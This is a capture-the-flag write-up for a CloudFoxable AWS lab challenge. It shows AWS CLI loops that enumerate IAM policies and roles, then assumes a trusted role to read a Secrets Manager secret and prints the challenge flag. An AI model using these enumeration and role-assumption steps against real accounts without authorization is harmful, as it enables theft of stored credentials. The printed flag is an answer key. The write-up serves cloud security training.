# CloudFoxable---Backwards
Find out who has access to DomainAdministrator-Credentials in secretsmanager and then use your cloudfoxable profile to access that role and grab the secret.
# CloudFoxable Write-up: "Backwards" Challenge

## Challenge Title
**Backwards**

## Category
AWS IAM / Secrets Manager / Enumeration

## Author
Seth Art (@sethsec)

## Challenge Description
> In this challenge, we are given an interesting secret ARN:
> 
> `arn:aws:secretsmanager:us-west-2:<account-id>:secret:DomainAdministrator-Credentials-3JoHlx`
> 
> The task is to find **who has access** to this secret, and then **assume the correct role** to retrieve it. 
> This simulates a real-world scenario where you may find a sensitive ARN during recon and need to work backwards to find accessible identities.

---

## Steps to Solve

### 1. **Start from the secret ARN**
We begin by examining who has permissions to access the secret `DomainAdministrator-Credentials`. Since we didn’t start with a user or role, this required an enumeration-first approach.

---

### 2. **List all local IAM policies**
```bash
aws iam list-policies --scope Local --profile cloudfoxable
```

We looped through each policy to look for references to the secret ARN:
```bash
for policy in $(aws iam list-policies --scope Local --query 'Policies[*].Arn' --output text); do
  version=$(aws iam get-policy --policy-arn $policy --query 'Policy.DefaultVersionId' --output text)
  match=$(aws iam get-policy-version --policy-arn $policy --version-id $version | grep 'DomainAdministrator-Credentials')
  if [ ! -z "$match" ]; then
    echo "🎯 FOUND IN POLICY: $policy"
  fi
done
```
 This revealed access was granted in the policy:
`corporate-domain-admin-password-policy`

---

### 3. **Find the role this policy is attached to**
```bash
for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  aws iam list-attached-role-policies --role-name "$role" \
    --query 'AttachedPolicies[*].PolicyArn' --output text | \
    grep -q 'corporate-domain-admin-password-policy' && echo "🔐 Attached to: $role"
done
```
 Result: `Alexander-Arnold` role has the policy.

---

### 4. **Check role trust relationship**
We ran:
```bash
aws iam get-role --role-name Alexander-Arnold
```
 It trusts: `user/ctf-starting-user`

That means we can assume this role from the profile tied to `ctf-starting-user`.

---

### 5. **Set up `cloudfoxable` profile with correct credentials**
Terraform gives you the `ctf-starting-user` access key and secret key after deployment. We added them to `~/.aws/credentials`:

```ini
[cloudfoxable]
aws_access_key_id = <your_ctf_user_access_key>
aws_secret_access_key = <your_ctf_user_secret_key>
region = us-west-2
```

Confirm identity:
```bash
aws sts get-caller-identity --profile cloudfoxable
```
 Success: Identity was `ctf-starting-user`

---

### 6. **Create `Alexander-Arnold` role profile**
Add this to `~/.aws/config`:
```ini
[profile Alexander-Arnold]
region = us-west-2
role_arn = arn:aws:iam::<account-id>:role/Alexander-Arnold
source_profile = cloudfoxable
```

---

### 7. **Retrieve the secret**
Final step:
```bash
aws secretsmanager get-secret-value \
  --secret-id arn:aws:secretsmanager:us-west-2:<account-id>:secret:DomainAdministrator-Credentials-3JoHlx \
  --query 'SecretString' \
  --output text \
  --profile Alexander-Arnold
```

✅ **Flag captured:**
```
FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}
```

---

## Key Takeaways
- Always check trust policies of IAM roles to see who can assume them.
- Even if you don’t have `sts:AssumeRole` permission, **you can assume a role if it trusts your identity**.
- This challenge mirrors real-world IAM privilege escalation paths.

---

## Tools Used
- AWS CLI
- Terraform (for setup)
- grep / jq / bash scripting
- CloudFox (used for hints and structure)

---

## Credits
Thanks to [@sethsec](https://twitter.com/sethsec) and the [Bishop Fox](https://github.com/BishopFox/cloudfoxable) team for this excellent gamified cloud hacking playground.

---

## 💡 Tips for Future Players
- Read trust policies carefully — they’re your doorways.
- Don't stop at one role. Assume as many as possible to map out the attack surface.
- Use `cloudfox role-trusts` or bash loops to automate path discovery.

Happy hacking! 🏴‍☠️

